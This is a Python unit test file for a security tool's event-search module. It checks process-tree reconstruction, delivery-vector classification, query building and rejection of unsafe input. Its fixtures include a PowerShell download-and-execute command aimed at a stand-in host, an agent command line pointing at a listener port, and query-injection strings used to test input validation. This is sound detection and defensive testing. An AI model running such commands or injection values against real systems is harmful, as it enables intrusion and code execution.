            return self.mock_client.command(*args, **kwargs)

        self.mock_client.command_async = AsyncMock(side_effect=_command_async)
        sleep_patch = patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock)
        sleep_patch.start()
        self.addCleanup(sleep_patch.stop)

    def _tree(self, **kwargs):
        arguments = {
            "device_id": AID,
            "pivot_time": PIVOT_TIME,
            "pivot_process_id": None,
            "pivot_image": None,
            "window_minutes": 10,
            "ancestry_max": 12,
            "descendants_max": 200,
        }
        arguments.update(kwargs)
        return asyncio.run(self.module.get_process_tree(**arguments))

    def _start_calls(self):
        return [
            call
            for call in self.mock_client.command.call_args_list
            if call.kwargs.get("operation") == "StartSearchV1"
        ]

    def test_tool_is_read_only(self):
        self.module.register_tools(self.mock_server)
        self.assert_tool_annotations("falcon_get_process_tree", READ_ONLY_ANNOTATIONS)

    def test_builds_ancestry_descendants_and_delivery_vector(self):
        self.mock_client.command.side_effect = [
            _started("job-window"),
            _done(PHISHING_CHAIN),
            # outlook.exe's parent "1" is not in the window: one lookup, which finds nothing.
            _started("job-parent"),
            _done([]),
        ]

        result = self._tree(pivot_process_id="30")

        self.assertEqual(result["pivot"]["process_id"], "30")
        self.assertEqual(result["pivot"]["parent_process_id"], "20")
        self.assertNotIn("_start_ms", result["pivot"])
        self.assertEqual([n["process_id"] for n in result["ancestry"]], ["20", "10"])
        self.assertEqual([n["depth"] for n in result["ancestry"]], [1, 2])
        self.assertEqual(
            [(n["process_id"], n["depth"]) for n in result["descendants"]],
            [("40", 1), ("50", 2)],
        )
        self.assertEqual(result["unresolved_parent_process_id"], "1")
        self.assertFalse(result["descendants_truncated"])

        vector = result["delivery_vector"]
        self.assertEqual(vector["kind"], "phishing_doc")
        self.assertEqual(vector["confidence"], "high")
        self.assertEqual(vector["method"], "heuristic")
        self.assertEqual(vector["anchor_process_id"], "10")
        self.assertTrue(vector["artifact"].endswith("inv.docm"))

        self.assertEqual(result["window"]["start"], "2025-01-01T11:50:00Z")
        self.assertEqual(result["window"]["end"], "2025-01-01T12:10:00Z")
        self.assertFalse(result["window"]["anchor_recovered"])
        self.assertEqual(result["window"]["events_scanned"], len(PHISHING_CHAIN))

        starts = self._start_calls()
        self.assertEqual(len(starts), 2)
        window_body = starts[0].kwargs["body"]
        self.assertEqual(starts[0].kwargs["repository"], "search-all")
        self.assertEqual(window_body["start"], PIVOT_MS - 600_000)
        self.assertEqual(window_body["end"], PIVOT_MS + 600_000)
        self.assertTrue(
            window_body["queryString"].startswith(
                f'#event_simpleName=ProcessRollup2 aid="{AID}"\n| select(['
            )
        )
        self.assertIn("sort(@timestamp, order=asc, limit=5000)", window_body["queryString"])
        self.assertIn('TargetProcessId="1"', starts[1].kwargs["body"]["queryString"])
        self.assertEqual([s["purpose"] for s in result["searches"]], ["window", "parent_lookup"])
        # Every Falcon call is awaited off the event loop.
        self.assertEqual(
            self.mock_client.command_async.await_count, self.mock_client.command.call_count
        )

    def test_parent_lookup_fills_a_gap_and_lowers_confidence(self):
        events = [e for e in PHISHING_CHAIN if e["TargetProcessId"] != "10"]
        self.mock_client.command.side_effect = [
            _started("job-window"),
            _done(events),
            _started("job-parent"),
            _done([PHISHING_CHAIN[0]]),
        ]

        result = self._tree(pivot_process_id="30")

        self.assertEqual([n["process_id"] for n in result["ancestry"]], ["20", "10"])
        # The lookup is spent, so outlook.exe's missing parent ends the walk.
        self.assertEqual(result["unresolved_parent_process_id"], "1")
        self.assertEqual(result["delivery_vector"]["kind"], "phishing_doc")
        self.assertEqual(result["delivery_vector"]["confidence"], "medium")
        self.assertEqual(len(self._start_calls()), 2)

    def test_anchor_recovery_recentres_the_window(self):
        late_start = T0 - 6 * 3600  # the process started six hours before the detection
        pivot = _pr2("30", "20", "rundll32.exe", late_start)
        parent = _pr2("20", "", "wsmprovhost.exe", late_start - 5)
        self.mock_client.command.side_effect = [
            _started("job-window"),
            _done([_pr2("70", "71", "svchost.exe", T0)]),
            _started("job-probe"),
            _done([pivot]),
            _started("job-recentred"),
            _done([parent, pivot]),
        ]

        result = self._tree(pivot_process_id=30)

        self.assertEqual(result["pivot"]["process_id"], "30")
        self.assertTrue(result["window"]["anchor_recovered"])
        self.assertEqual(result["window"]["pivot_time"], "2025-01-01T06:00:00Z")
        self.assertEqual([n["process_id"] for n in result["ancestry"]], ["20"])
        self.assertEqual(result["delivery_vector"]["kind"], "lateral_winrm")
        self.assertEqual(
            [s["purpose"] for s in result["searches"]],
            ["window", "anchor_probe", "recentred_window"],
        )

        probe_body = self._start_calls()[1].kwargs["body"]
        self.assertIn('TargetProcessId="30"', probe_body["queryString"])
        self.assertIn("limit=1)", probe_body["queryString"])
        self.assertEqual(probe_body["start"], PIVOT_MS - 7 * 24 * 3600 * 1000)
        self.assertEqual(probe_body["end"], PIVOT_MS + 600_000)
        recentred_body = self._start_calls()[2].kwargs["body"]
        self.assertEqual(recentred_body["start"], int(late_start * 1000) - 600_000)

    def test_pivot_not_found_anywhere(self):
        self.mock_client.command.side_effect = [
            _started("job-window"),
            _done([_pr2("70", "71", "svchost.exe", T0)]),
            _started("job-probe"),
            _done([]),
            _started("job-blocked"),
            _done([]),
        ]

        result = self._tree(pivot_process_id="30")

        self.assertIsNone(result["pivot"])
        self.assertEqual(result["ancestry"], [])
        self.assertIsNone(result["delivery_vector"])
        self.assertTrue(
            any("No ProcessRollup2 or ProcessBlocked" in note for note in result["notes"])
        )
        self.assertEqual(
            [s["purpose"] for s in result["searches"]],
            ["window", "anchor_probe", "blocked_probe"],
        )

    def test_blocked_pivot_comes_from_process_blocked(self):
        # The sensor blocked powershell.exe before it ran: no ProcessRollup2 for "30",
        # but its parent chain winword.exe <- outlook.exe is in the window.
        chain = [e for e in PHISHING_CHAIN if e["TargetProcessId"] in ("10", "20")]
        blocked = _pr2(
            "30",
            "20",
            "powershell.exe",
            T0 - 1,
            "powershell -nop -c iex(iwr http://x/a)",
            ParentBaseFileName="WINWORD.EXE",
            SignInfoFlags="8683538",
        )
        self.mock_client.command.side_effect = [
            _started("job-window"),
            _done(chain),
            _started("job-probe"),
            _done([]),
            _started("job-blocked"),
            _done([blocked]),
            # outlook.exe's parent "1" is missing from the window.
            _started("job-parent"),
            _done([]),
        ]

        result = self._tree(pivot_process_id="30")

        pivot = result["pivot"]
        self.assertEqual(pivot["process_id"], "30")
        self.assertTrue(pivot["blocked"])
        self.assertEqual(pivot["source_event"], "ProcessBlocked")
        self.assertEqual(pivot["parent_process_id"], "20")
        self.assertEqual(pivot["parent_image"], "WINWORD.EXE")
        self.assertEqual(pivot["command_line"], "powershell -nop -c iex(iwr http://x/a)")
        self.assertEqual(pivot["signing"], {"sign_info_flags": "8683538"})
        self.assertEqual([n["process_id"] for n in result["ancestry"]], ["20", "10"])
        self.assertTrue(all(not n["blocked"] for n in result["ancestry"]))
        self.assertEqual(result["ancestry"][0]["source_event"], "ProcessRollup2")
        self.assertEqual(result["descendants"], [])
        self.assertEqual(result["delivery_vector"]["kind"], "phishing_doc")
        self.assertFalse(result["window"]["anchor_recovered"])
        self.assertTrue(any("ProcessBlocked event" in note for note in result["notes"]))
        self.assertFalse(any("7 days" in note for note in result["notes"]))
        self.assertEqual(
            [s["purpose"] for s in result["searches"]],
            ["window", "anchor_probe", "blocked_probe", "parent_lookup"],
        )

        blocked_body = self._start_calls()[2].kwargs["body"]
        self.assertTrue(
            blocked_body["queryString"].startswith(
                f'#event_simpleName=ProcessBlocked aid="{AID}" TargetProcessId="30"\n'
            )
        )
        self.assertIn("ParentBaseFileName", blocked_body["queryString"])
        self.assertIn("limit=1)", blocked_body["queryString"])
        self.assertEqual(blocked_body["start"], PIVOT_MS - 7 * 24 * 3600 * 1000)
        self.assertEqual(blocked_body["end"], PIVOT_MS + 600_000)

    def test_blocked_pivot_outside_the_window_recentres_it(self):
        late = T0 - 3 * 3600
        blocked = _pr2("30", "20", "mimikatz.exe", late)
        parent = _pr2("20", "", "cmd.exe", late - 5)
        self.mock_client.command.side_effect = [
            _started("job-window"),
            _done([_pr2("70", "71", "svchost.exe", T0)]),
            _started("job-probe"),
            _done([]),
            _started("job-blocked"),
            _done([blocked]),
            _started("job-recentred"),
            _done([parent]),
        ]

        result = self._tree(pivot_process_id="30")

        self.assertTrue(result["pivot"]["blocked"])
        self.assertEqual([n["process_id"] for n in result["ancestry"]], ["20"])
        self.assertTrue(result["window"]["anchor_recovered"])
        self.assertEqual(result["window"]["pivot_time"], "2025-01-01T09:00:00Z")
        self.assertIsNone(result["unresolved_parent_process_id"])
        self.assertEqual(
            [s["purpose"] for s in result["searches"]],
            ["window", "anchor_probe", "blocked_probe", "recentred_window"],
        )
        recentred_body = self._start_calls()[3].kwargs["body"]
        self.assertEqual(recentred_body["start"], int(late * 1000) - 600_000)

    def test_blocked_pivot_without_a_parent_says_so(self):
        blocked = _pr2("30", None, "evil.exe", T0)
        self.mock_client.command.side_effect = [
            _started("job-window"),
            _done([]),
            _started("job-probe"),
            _done([]),
            _started("job-blocked"),
            _done([blocked]),
        ]

        result = self._tree(pivot_process_id="30")

        self.assertTrue(result["pivot"]["blocked"])
        self.assertIsNone(result["pivot"]["parent_process_id"])
        self.assertEqual(result["ancestry"], [])
        self.assertTrue(any("names no parent process" in note for note in result["notes"]))
        self.assertEqual(len(self._start_calls()), 3)

    def test_no_blocked_probe_when_the_pivot_is_named_by_image(self):
        # There is no process id to probe for.
        self.mock_client.command.side_effect = [_started("job"), _done([])]
        result = self._tree(pivot_image="evil.exe")
        self.assertIsNone(result["pivot"])
        self.assertEqual([s["purpose"] for s in result["searches"]], ["window"])

    def test_search_count_never_exceeds_the_limit(self):
        orphan = _pr2("30", "20", "rundll32.exe", T0 - 3600)
        self.mock_client.command.side_effect = [
            _started("j1"),
            _done([]),
            _started("j2"),
            _done([orphan]),
            _started("j3"),
            _done([]),
            _started("j4"),
            _done([]),
        ]

        result = self._tree(pivot_process_id="30")

        self.assertEqual(result["pivot"]["process_id"], "30")
        self.assertEqual(len(self._start_calls()), 4)
        self.assertLessEqual(len(result["searches"]), 4)
        self.assertEqual(result["unresolved_parent_process_id"], "20")

    def test_pivot_by_image_takes_the_closest_start(self):
        events = [
            _pr2("31", "20", "powershell.exe", T0 - 500),
            _pr2("32", "20", "PowerShell.exe", T0 - 10),
            _pr2("20", "", "explorer.exe", T0 - 900),
        ]
        self.mock_client.command.side_effect = [_started("job"), _done(events)]

        result = self._tree(pivot_image="powershell.exe")

        self.assertEqual(result["pivot"]["process_id"], "32")
        self.assertEqual([n["process_id"] for n in result["ancestry"]], ["20"])
        self.assertEqual(len(self._start_calls()), 1)

    def test_pivot_by_image_not_found_runs_no_probe(self):
        self.mock_client.command.side_effect = [_started("job"), _done(PHISHING_CHAIN)]

        result = self._tree(pivot_image="mshta.exe")

        self.assertIsNone(result["pivot"])
        self.assertEqual(len(self._start_calls()), 1)
        self.assertTrue(any("mshta.exe" in note for note in result["notes"]))

    def test_context_process_id_links_children_when_parent_id_is_absent(self):
        events = [
            _pr2("30", None, "powershell.exe", T0 - 10, ContextProcessId="20"),
            _pr2("20", None, "explorer.exe", T0 - 100),
            _pr2("40", None, "cmd.exe", T0, ContextProcessId="30"),
        ]
        self.mock_client.command.side_effect = [_started("job"), _done(events)]

        result = self._tree(pivot_process_id="30")

        self.assertEqual([n["process_id"] for n in result["ancestry"]], ["20"])
        self.assertEqual([n["process_id"] for n in result["descendants"]], ["40"])

    def test_descendants_are_capped(self):
        children = [_pr2(str(100 + i), "30", "conhost.exe", T0 + i) for i in range(5)]
        events = [_pr2("30", "", "cmd.exe", T0 - 1), *children]
        self.mock_client.command.side_effect = [_started("job"), _done(events)]

        result = self._tree(pivot_process_id="30", descendants_max=3)

        self.assertEqual(len(result["descendants"]), 3)
        self.assertTrue(result["descendants_truncated"])

    def test_window_search_error_is_returned(self):
        self.mock_client.command.return_value = {
            "status_code": 403,
            "body": {"errors": [{"message": "Forbidden"}]},
        }

        result = self._tree(pivot_process_id="30")

        self.assertIn("error", result)
        self.assertEqual(result["searches"][0]["status"], "error")
        self.assertEqual(len(self._start_calls()), 1)

    @patch("falcon_mcp.modules.ngsiem.TIMEOUT_SECONDS", 10)
    @patch("falcon_mcp.modules.ngsiem.POLL_INTERVAL_SECONDS", 5)
    def test_window_search_timeout_stops_the_job(self):
        not_done = {"status_code": 200, "body": {"done": False}}
        self.mock_client.command.side_effect = [
            _started("job-slow"),
            not_done,
            not_done,
            {"status_code": 200, "body": {}},
        ]

        result = self._tree(pivot_process_id="30")

        self.assertIsNone(result["pivot"])
        self.assertEqual(result["searches"][0]["status"], "timed_out")
        last = self.mock_client.command.call_args_list[-1]
        self.assertEqual(last.kwargs["operation"], "StopSearchV1")
        self.assertEqual(last.kwargs["id"], "job-slow")

    @patch("falcon_mcp.modules.ngsiem.TIMEOUT_SECONDS", 0)
    def test_spent_time_budget_starts_no_search(self):
        result = self._tree(pivot_process_id="30")

        self.assertIsNone(result["pivot"])
        self.mock_client.command.assert_not_called()
        self.assertTrue(any("time budget" in note for note in result["notes"]))

    def _fake_clock(self):
        """Make asyncio.sleep advance time.monotonic, so deadlines pass as polls run."""
        clock = [1000.0]

        async def _sleep(seconds):
            clock[0] += seconds

        sleep_patch = patch("falcon_mcp.modules.ngsiem.asyncio.sleep", side_effect=_sleep)
        clock_patch = patch(
            "falcon_mcp.modules.ngsiem.time.monotonic", side_effect=lambda: clock[0]
        )
        sleep_patch.start()
        clock_patch.start()
        self.addCleanup(sleep_patch.stop)
        self.addCleanup(clock_patch.stop)

    @patch("falcon_mcp.modules.ngsiem.POLL_INTERVAL_SECONDS", 5)
    def test_time_budget_returns_the_partial_tree(self):
        self._fake_clock()
        running = {"status_code": 200, "body": {"done": False, "events": PHISHING_CHAIN}}
        self.mock_client.command.side_effect = [
            _started("job-window"),
            running,
            running,
            {"status_code": 204, "body": {}},
        ]

        result = self._tree(pivot_process_id="30", time_budget_seconds=10)

        self.assertNotIn("error", result)
        self.assertTrue(result["partial"])
        self.assertIn("window", result["partial_reason"])
        self.assertIn("parent_lookup", result["partial_reason"])
        # The rows the window search found before it was stopped still build a tree.
        self.assertEqual(result["pivot"]["process_id"], "30")
        self.assertEqual([n["process_id"] for n in result["ancestry"]], ["20", "10"])
        self.assertEqual([n["process_id"] for n in result["descendants"]], ["40", "50"])
        self.assertEqual(result["searches"][0]["status"], "timed_out")
        self.assertEqual(result["searches"][0]["event_count"], len(PHISHING_CHAIN))
        self.assertTrue(any("10-second time budget" in note for note in result["notes"]))
        self.assertTrue(any("Skipped the parent_lookup" in note for note in result["notes"]))
        self.assertFalse(any("was not found" in note for note in result["notes"]))
        # Stopped at the budget, not at FALCON_MCP_NGSIEM_TIMEOUT; no second search.
        last = self.mock_client.command.call_args_list[-1]
        self.assertEqual(last.kwargs["operation"], "StopSearchV1")
        self.assertEqual(len(self._start_calls()), 1)

    @patch("falcon_mcp.modules.ngsiem.POLL_INTERVAL_SECONDS", 5)
    def test_time_budget_clips_a_later_search_to_what_is_left(self):
        self._fake_clock()
        running = {"status_code": 200, "body": {"done": False}}
        self.mock_client.command.side_effect = [
            _started("job-window"),
            _done(PHISHING_CHAIN),  # done after 5 of the 20 seconds
            _started("job-parent"),
            running,
            running,
            running,
            {"status_code": 204, "body": {}},
        ]

        result = self._tree(pivot_process_id="30", time_budget_seconds=20)

        polls = [
            call
            for call in self.mock_client.command.call_args_list
            if call.kwargs.get("operation") == "GetSearchStatusV1"
            and call.kwargs.get("search_id") == "job-parent"
        ]
        # 15 seconds were left for the parent lookup: three 5-second polls.
        self.assertEqual(len(polls), 3)
        self.assertTrue(result["partial"])
        self.assertEqual(result["unresolved_parent_process_id"], "1")
        self.assertEqual([s["status"] for s in result["searches"]], ["completed", "timed_out"])
        self.assertFalse(any("was not found" in note for note in result["notes"]))

    @patch("falcon_mcp.modules.ngsiem.POLL_INTERVAL_SECONDS", 5)
    def test_time_budget_cut_probe_is_not_reported_as_missing(self):
        self._fake_clock()
        running = {"status_code": 200, "body": {"done": False}}
        self.mock_client.command.side_effect = [
            _started("job-window"),
            _done([_pr2("70", "71", "svchost.exe", T0)]),
            _started("job-probe"),
            running,
            {"status_code": 204, "body": {}},
        ]

        result = self._tree(pivot_process_id="30", time_budget_seconds=10)

        self.assertIsNone(result["pivot"])
        self.assertTrue(result["partial"])
        self.assertIn("anchor_probe", result["partial_reason"])
        self.assertFalse(any("7 days" in note for note in result["notes"]))

    def test_time_budget_not_reached_is_not_partial(self):
        self.mock_client.command.side_effect = [
            _started("job-window"),
            _done(PHISHING_CHAIN),
            _started("job-parent"),
            _done([]),
        ]

        result = self._tree(pivot_process_id="30", time_budget_seconds=45)

        self.assertFalse(result["partial"])
        self.assertNotIn("partial_reason", result)
        self.assertEqual(result["pivot"]["process_id"], "30")

    def test_without_time_budget_there_is_no_partial_key(self):
        self.mock_client.command.side_effect = [
            _started("job"),
            _done(PHISHING_CHAIN),
            _started("job-parent"),
            _done([]),
        ]
        result = self._tree(pivot_image="powershell.exe")
        self.assertNotIn("partial", result)
        self.assertNotIn("partial_reason", result)

    def test_time_budget_error_is_returned_unchanged(self):
        self.mock_client.command.return_value = {
            "status_code": 403,
            "body": {"errors": [{"message": "Forbidden"}]},
        }
        result = self._tree(pivot_process_id="30", time_budget_seconds=45)
        self.assertIn("error", result)
        self.assertNotIn("partial", result)

    def test_invalid_time_budget_is_rejected_before_any_search(self):
        for value in (9, 291, True, "45", 45.5):
            with self.subTest(value=value):
                result = self._tree(pivot_process_id="30", time_budget_seconds=value)
                self.assertIn("error", result)
                self.assertIn("time_budget_seconds", result["error"])
                self.mock_client.command.assert_not_called()

    def test_unsafe_arguments_are_rejected_before_any_search(self):
        hostile = ['"', "\\", "\n", "|", "'", '" | head(1) | "', "\r"]
        cases = []
        for text in hostile:
            cases += [
                {"device_id": AID[:-1] + text},
                {"device_id": AID + text},
                {"device_id": text + AID},
                {"pivot_process_id": "123" + text},
                {"pivot_process_id": text + "123"},
                {"pivot_image": "evil" + text + ".exe"},
                {"pivot_time": PIVOT_TIME + text},
            ]
        cases += [
            {"device_id": "z" * 32},
            {"device_id": AID.upper() + "0"},
            {"pivot_process_id": "1" * 21},
            {"pivot_process_id": "\u0661\u0662\u0663"},  # non-ASCII digits
            {"pivot_process_id": -5},
            {"pivot_process_id": True},
            {"pivot_image": "a" * 129},
            {"pivot_image": "C:/Windows/evil.exe"},
            {"pivot_time": "yesterday"},
            {"pivot_time": "2" * 100},
            {"window_minutes": 0},
            {"window_minutes": 121},
            {"ancestry_max": 31},
            {"descendants_max": 0},
            {"pivot_process_id": None, "pivot_image": None},
        ]
        for case in cases:
            arguments = {"pivot_process_id": "30", **case}
            with self.subTest(case=case):
                result = self._tree(**arguments)
                self.assertIn("error", result)
                self.mock_client.command.assert_not_called()
                self.mock_client.command_async.assert_not_awaited()

    def test_hostile_ids_in_events_never_reach_a_query(self):
        hostile = '20" | groupBy([aid]) | "'
        events = [_pr2("30", hostile, "powershell.exe", T0 - 10)]
        self.mock_client.command.side_effect = [_started("job"), _done(events)]

        result = self._tree(pivot_process_id="30")

        self.assertEqual(result["pivot"]["process_id"], "30")
        self.assertIsNone(result["pivot"]["parent_process_id"])
        self.assertEqual(len(self._start_calls()), 1)
        for call in self.mock_client.command.call_args_list:
            self.assertNotIn("groupBy", str(call))


class TestProcessRollupQuery(unittest.TestCase):
    """The CQL builder accepts only hex, digits and its own fixed text."""

    def test_query_text(self):
        self.assertEqual(
            _process_rollup_query(AID.upper(), 5, "123"),
            f'#event_simpleName=ProcessRollup2 aid="{AID}" TargetProcessId="123"\n'
            "| select([@timestamp, aid, TargetProcessId, ParentProcessId, ContextProcessId, "
            "RawProcessId, ImageFileName, FileName, CommandLine, UserName, UserSid, "
            "SHA256HashData, ProcessStartTime, FileSignInfo, SignInfoFlags, SigningId, "
            "CodeSigningFlags])\n"
            "| sort(@timestamp, order=asc, limit=5)",
        )

    def test_process_blocked_query_and_unknown_event_names(self):
        query = _process_rollup_query(AID, 1, "30", event_name="ProcessBlocked")
        self.assertTrue(query.startswith(f'#event_simpleName=ProcessBlocked aid="{AID}"'))
        self.assertIn("CodeSigningFlags, ParentBaseFileName])", query)
        for event_name in ("ProcessRollup2 | x", "EndOfProcess", "", None):
            with self.subTest(event_name=event_name):
                with self.assertRaises(ValueError):
                    _process_rollup_query(AID, 1, "30", event_name=event_name)

    def test_rejects_unsafe_values(self):
        for device_id, limit, pid in [
            (AID + '"', 5, None),
            (AID[:31] + "\n", 5, None),
            (AID, 5, '1"'),
            (AID, 5, "1|x"),
            (AID, 5, "1\\"),
            (AID, 5, ""),
            (AID, 0, None),
            (AID, 5001, None),
            (AID, True, None),
            (AID, "5", None),
            (None, 5, None),
        ]:
            with self.subTest(device_id=device_id, limit=limit, pid=pid):
                with self.assertRaises(ValueError):
                    _process_rollup_query(device_id, limit, pid)


class TestDeliveryVector(unittest.TestCase):
    """The heuristic classifies an ancestry chain, pivot first."""

    @staticmethod
    def _chain(*nodes):
        return [
            {"process_id": str(i), "image": f"C:\\x\\{image}", "command_line": command_line}
            for i, (image, command_line) in enumerate(nodes)
        ]

    def test_kinds(self):
        cases = [
            ([("cmd.exe", ""), ("winword.exe", "a.docx"), ("outlook.exe", "")], "phishing_doc"),
            ([("cmd.exe", ""), ("excel.exe", "C:\\share\\b.xlsm")], "malicious_document"),
            ([("cmd.exe", ""), ("outlook.exe", "")], "phishing_email_direct"),
            (
                [("evil.exe", "C:\\Users\\a\\Downloads\\evil.exe"), ("chrome.exe", "")],
                "browser_drive_by",
            ),
            ([("evil.exe", ""), ("7zg.exe", "")], "archive_extraction"),
            ([("cmd.exe", ""), ("wsmprovhost.exe", "")], "lateral_winrm"),
            ([("cmd.exe", ""), ("psexesvc.exe", "")], "lateral_psexec"),
            ([("cmd.exe", ""), ("taskhostw.exe", "")], "scheduled_task"),
            ([("cmd.exe", ""), ("wmiprvse.exe", "")], "wmi_execution"),
            (
                [("cmd.exe", ""), ("python.exe", "python C:\\t\\agent.py --server http://x:4444")],
                "interpreter_agent",
            ),
            ([("whoami.exe", ""), ("powershell.exe", "")], "script_host_root"),
            ([("evil.exe", ""), ("services.exe", "")], "service"),
            ([("evil.exe", ""), ("unknown.exe", "")], "unknown"),
            ([], "unknown"),
        ]
        for nodes, kind in cases:
            with self.subTest(kind=kind):
                verdict = _classify_delivery_vector(self._chain(*nodes), False)
                self.assertEqual(verdict["kind"], kind)
                self.assertEqual(verdict["method"], "heuristic")

    def test_widened_lookup_lowers_high_confidence(self):
        chain = self._chain(("cmd.exe", ""), ("wsmprovhost.exe", ""))
        self.assertEqual(_classify_delivery_vector(chain, False)["confidence"], "high")
        self.assertEqual(_classify_delivery_vector(chain, True)["confidence"], "medium")


class TestLookupCqlFunction(TestModules):
    """Test cases for falcon_lookup_cql_function."""

    def setUp(self):
        self.setup_module(NGSIEMModule)

    def test_tool_is_read_only(self):
        self.module.register_tools(self.mock_server)
        self.assert_tool_annotations("falcon_lookup_cql_function", READ_ONLY_ANNOTATIONS)

    def test_exact_match(self):
        result = self.module.lookup_cql_function(name="groupBy")

        self.assertEqual(result["match"], "exact")
        function = result["function"]
        self.assertEqual(function["name"], "groupBy")
        self.assertTrue(function["signature"].startswith("groupBy("))
        self.assertIn({"name": "field", "required": True}, function["params"])
        self.assertIn("aggregate", function["categories"])
        self.assertEqual(
            function["doc_url"], "https://library.humio.com/data-analysis/functions-groupby.html"
        )
        self.mock_client.command.assert_not_called()

    def test_case_insensitive_match_and_call_syntax(self):
        self.assertEqual(
            self.module.lookup_cql_function(name="GROUPBY")["match"], "case_insensitive"
        )
        result = self.module.lookup_cql_function(name=" sort(field, limit=5) ")
        self.assertEqual(result["match"], "exact")
        self.assertEqual(result["function"]["name"], "sort")

    def test_close_matches(self):
        result = self.module.lookup_cql_function(name="gropBy")

        self.assertEqual(result["match"], "candidates")
        self.assertEqual(result["candidates"][0]["name"], "groupBy")

    def test_partial_matches_include_namespaced_functions(self):
        result = self.module.lookup_cql_function(name="dedup")

        self.assertEqual(result["match"], "candidates")
        self.assertIn("array:dedup", [c["name"] for c in result["candidates"]])

    def test_common_non_function_gets_a_hint(self):
        result = self.module.lookup_cql_function(name="limit")

        self.assertNotEqual(result["match"], "exact")
        self.assertIn("head(N)", result["hint"])

    def test_invalid_names(self):
        for name in ["", "   ", "x" * 129, None]:
            with self.subTest(name=name):
                self.assertIn("error", self.module.lookup_cql_function(name=name))


class TestCqlCatalog(unittest.TestCase):
    """The shipped catalog carries facts only, never documentation prose."""

    ALLOWED_KEYS = {
        "name",
        "signature",
        "params",
        "categories",
        "default_arg",
        "availability",
        "doc_url",
    }

    def test_catalog_records_hold_only_factual_fields(self):
        path = Path(ngsiem_module.__file__).parent.parent / "resources" / "cql_functions.json"
        data = json.loads(path.read_text(encoding="utf-8"))

        self.assertEqual(set(data), {"source", "fields", "function_count", "functions"})
        self.assertEqual(data["function_count"], len(data["functions"]))
        self.assertGreater(len(data["functions"]), 100)
        for function in data["functions"]:
            with self.subTest(function=function["name"]):
                self.assertEqual(set(function), self.ALLOWED_KEYS)
                self.assertRegex(
                    function["doc_url"],
                    r"^https://library\.humio\.com/data-analysis/functions-[a-z0-9._-]+\.html$",
                )
                for param in function["params"]:
                    self.assertEqual(set(param), {"name", "required"})
                if function["availability"] is not None:
                    self.assertLessEqual(len(function["availability"]), 40)

    def test_catalog_loads_as_package_data(self):
        self.assertIn("groupBy", ngsiem_module._load_cql_catalog())
        pyproject = tomllib.loads(
            (Path(__file__).resolve().parents[2] / "pyproject.toml").read_text(encoding="utf-8")
        )
        package_data = pyproject["tool"]["setuptools"]["package-data"]
        self.assertIn("*.json", package_data["falcon_mcp.resources"])

    def test_build_script_drops_prose(self):
        catalog = build_cql_catalog.build_catalog(
            {
                "functions": [
                    {
                        "name": "array:sort",
                        "signature": "array:sort(array, [order])",
                        "categories": ["array"],
                        "default_arg": "array",
                        "availability": None,
                        "description": "Some prose that must not ship.",
                        "doc_url": "https://library.humio.com/data-analysis/functions-array-sort.html",
                    }
                ]
            }
        )

        (function,) = catalog["functions"]
        self.assertNotIn("description", function)
        self.assertNotIn("prose", json.dumps(catalog))
        self.assertEqual(
            function["params"],
            [{"name": "array", "required": True}, {"name": "order", "required": False}],
        )

    def test_build_script_rejects_a_mismatched_signature(self):
        with self.assertRaises(ValueError):
            build_cql_catalog.build_catalog([{"name": "head", "signature": "tail([limit])"}])


class TestNGSIEMModuleConfig(unittest.TestCase):
    """Test configuration handling for NGSIEM module."""

    def test_default_config_values(self):
        """Test that default config values are set correctly."""
        # Clear any env overrides and test defaults
        with patch.dict(os.environ, {}, clear=True):
            # Re-evaluate the config by reimporting
            poll_interval = int(os.environ.get("FALCON_MCP_NGSIEM_POLL_INTERVAL", "5"))
            timeout = int(os.environ.get("FALCON_MCP_NGSIEM_TIMEOUT", "300"))

            self.assertEqual(poll_interval, 5)
            self.assertEqual(timeout, 300)

    def test_custom_config_from_env(self):
        """Test that custom config values are read from environment."""
        with patch.dict(
            os.environ,
            {"FALCON_MCP_NGSIEM_POLL_INTERVAL": "10", "FALCON_MCP_NGSIEM_TIMEOUT": "60"},
        ):
            poll_interval = int(os.environ.get("FALCON_MCP_NGSIEM_POLL_INTERVAL", "5"))
            timeout = int(os.environ.get("FALCON_MCP_NGSIEM_TIMEOUT", "300"))

            self.assertEqual(poll_interval, 10)
            self.assertEqual(timeout, 60)


class TestSearchNgsiemBounded(TestModules):
    """check_cql, hours_back, max_rows and time_budget_seconds on falcon_search_ngsiem."""

    def setUp(self):
        self.setup_module(NGSIEMModule)

        async def _command_async(*args, **kwargs):
            return self.mock_client.command(*args, **kwargs)

        self.mock_client.command_async = AsyncMock(side_effect=_command_async)

    def _search(self, **kwargs):
        params = {"query_string": "#event_simpleName=ProcessRollup2 | head(5)", "repository": "search-all"}
        params.update(kwargs)
        return asyncio.run(self.module.search_ngsiem(**params))

    def test_check_cql_fails_locally_with_fix(self):
        result = self._search(
            query_string="event_simpleName=ProcessRollup2 | sort(_count)",
            hours_back=1,
            check_cql=True,
        )
        self.mock_client.command.assert_not_called()
        self.assertFalse(result["ok"])
        self.assertIn("error", result)
        self.assertEqual(
            [issue["rule"] for issue in result["cql_lint"]],
            ["missing_tag_prefix", "sort_without_limit"],
        )
        self.assertEqual(result["cql"], "event_simpleName=ProcessRollup2 | sort(_count)")
        self.assertEqual(result["fix"], "#event_simpleName=ProcessRollup2 | sort(_count, limit=1000)")

    def test_check_cql_unknown_function_warns_but_still_searches(self):
        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-1"}},
            {"status_code": 200, "body": {"done": True, "events": [{"a": 1}]}},
        ]
        with patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock):
            result = self._search(
                query_string="#event_simpleName=ProcessRollup2 | hed(5)",
                hours_back=1,
                check_cql=True,
            )
        self.assertTrue(result["ok"])
        self.assertEqual(result["results"], [{"a": 1}])
        self.assertEqual([w["match"] for w in result["cql_warnings"]], ["hed("])
        self.assertIn("head", result["cql_warnings"][0]["suggestions"])

    def test_check_cql_clean_query_has_no_warnings(self):
        self.mock_client.command.side_effect = [
            {"status_code": 200, "body": {"id": "job-1"}},
            {"status_code": 200, "body": {"done": True, "events": []}},
        ]
        with patch("falcon_mcp.modules.ngsiem.asyncio.sleep", new_callable=AsyncMock):
            result = self._search(
                query_string=(
                    "#event_simpleName=ProcessRollup2 | groupBy([ComputerName], "
                    "function=count(as=cnt)) | sort(cnt, order=desc, limit=5)"
                ),
                hours_back=1,
                check_cql=True,
            )
        self.assertTrue(result["ok"])
        self.assertEqual(result["cql_warnings"], [])

